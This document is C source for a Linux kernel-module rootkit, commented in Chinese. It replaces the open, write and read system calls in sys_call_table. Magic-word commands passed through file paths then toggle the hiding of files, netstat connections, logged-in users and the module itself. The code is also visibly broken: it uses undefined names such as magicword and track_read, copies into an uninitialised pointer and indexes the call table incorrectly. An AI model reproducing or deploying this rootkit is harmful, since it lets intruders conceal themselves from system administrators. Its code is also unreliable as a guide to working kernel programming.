#define MODULE
#define __KERNEL__

#if CONFIG_MODVERSIONS==1
#define MODVERSIONS
#include <linux/modversions.h>
#endif


#include <linux/module.h>
#include <linux/mm.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/dirent.h>
#include <linux/proc_fs.h>
#include <linux/stat.h>
#include <linux/fcntl.h>
#include <linux/if.h>
#include <linux/smp_lock.h>
#include <sys/syscall.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include <asm/segment.h>
#include <malloc.h>


extern void* sys_call_table[];/*导出系统调用表*/

asmlinkage int (*real_open)(const char *, int  ,int );/*定义open,read,write调用*/
asmlinkage int (*real_write)(unsigned int , char *, unsigned int);
asmlinkage int (*real_read)(unsigned int, char *, unsigned int);

asmlinkage void cleanup_module(void);

/*替换的open调用*/
asmlinkage int track_open(const char *pathname, int flag, int mod) {
/*这个asmlinkage定义,在核心代码的socket.c中，是一个内联函数，
主要是gcc在编译的时候连接asm代码*/
  char *k_pathname;
  char *x,*cmd,*tmp,*arg;
  int i = 0;
  k_pathname = (char*) kmalloc(256, GFP_KERNEL);

  copy_from_user(k_pathname, pathname, 255);/*从用户区得到pathname值到内核空间*/
  x = strstr(k_pathname, magicword);    /*检查pathname里面有没有我们想要隐藏的东东*/
  if ( x ) {
    tmp = &x[strlen(magicword)];
    if (strlen(tmp) >= 4) {
      if (strlen(tmp) > 4)
      arg = &tmp[4];
      else arg = 0;
      cmd = strncpy(cmd, tmp, 4);
      cmd[4] = '\0';
      if (strcmp(cmd,M_UID_FUNC) == 0) {      
    if (arg == 0) {
          if (uid_func == 1) uid_func--;
          else uid_func++;
    }  
    else if (arg != 0 && strcmp(arg,BE_VERBOSE_CMD) == 0)      
      printk("the value of uid_func is : %d\n",uid_func);
      }
      else if (strcmp(cmd,GETDENTS_FUNC) == 0) {        /*确定隐藏文件本身的目录列表显示*/
        if (arg == 0) {
          if (hidf_func) hidf_func--;
          else hidf_func++;
    }
    else if (arg != 0 && strcmp(arg,BE_VERBOSE_CMD) == 0)
      printk("the value of hidf_func is : %d the hidden files prefix is : %s\n  ",hidf_func,file2hide);
    else if (arg != 0 && strcmp(arg,BE_VERBOSE_CMD)) {
      memset(file2hide,0,sizeof(file2hide));
      strncpy(file2hide,arg,strlen(arg));
    }
      }
      else if (strcmp(cmd,NETSTAT_FUNC) == 0) {   /*确定隐藏netstat的输出行*/
    if (arg == 0) {
          if (nets_func == 1) nets_func--;
          else nets_func++;
    }
    else if(strcmp(arg,BE_VERBOSE_CMD) == 0) {
      printk("the value of nets_func is : %d the hidden port is: %s are hidden lines that contains %s too\n"
         ,nets_func, HIDDEN_PORT, netstatstuff );
    }
    else if (strcmp(arg,BE_VERBOSE_CMD) != 0) {
      memset(netstatstuff,0,sizeof(netstatstuff));
      strncpy(netstatstuff,arg,strlen(arg));
    }
      }
      else if(strcmp(cmd,FINGER_FUNC) == 0) {  /*确定隐藏finger输出*/
    if (arg == 0) {
          if (hidu_func == 1) hidu_func--;
          else hidu_func++;
        }
    else if (arg != 0 && strcmp(arg,BE_VERBOSE_CMD) == 0)
      printk("the value of hidu_func is : %d the hidden user is %s\n", hidu_func, hiddenuser);
    else if (arg != 0 && strcmp(arg,BE_VERBOSE_CMD)) {
      memset(hiddenuser,0,sizeof(hiddenuser));
      strncpy(hiddenuser,arg,strlen(arg));
    }
      }
      else if(strcmp(cmd,HIDELKM_FUNC) == 0) {   /*确定隐藏自身模块*/
    if (arg == 0) {
      if (hidm_func == 1) hidm_func--;
      else hidm_func++;
    }
    else if (arg != 0&& strcmp(arg,BE_VERBOSE_CMD) == 0)
      printk("the value of hidm_func is : %d the module name hidden is : %s\n",hidm_func, LKM_NAME);
      }

      else if (!strcmp(cmd,UNINST_LKM)) {
    printk("unistalling %s\n",LKM_NAME);
    cleanup_module();
      }
     
    }
    kfree(k_pathname);                         /*释放内核内存空间*/
    return (real_open(pathname, flag, mod));
  }

  else {
    kfree(k_pathname);
    return(real_open(pathname, flag, mod));
  }
}

/*截获write调用*/
asmlinkage int track_write(unsigned int fd, char *buf,unsigned int count) {

  return real_write(fd, buf,count);

}
/*开始加载我们的内核模块！*/
int init_module(void){

  real_open=sys_call_table[SYS_open];/*保存原open调用*/
  sys_call_table[SYS_open]=track_open;/*截获*/


  real_write=sys_call_table[SYS_write];/*保存write调用*/
  sys_call_table[SYS_write]=track_write;/*截获*/

  real_query_module=sys_call_table[SYS_read];/*保存原read调用*/
  sys_call_table[read]=track_read;/*截获*/

  return 0;  
}
 
void cleanup_module(void){                    /*卸载*/

  sys_call_table[SYS_open]=real_open;
  sys_call_table[SYS_write]=real_write;
  sys_call_table[SYS_read]=real_read;

}



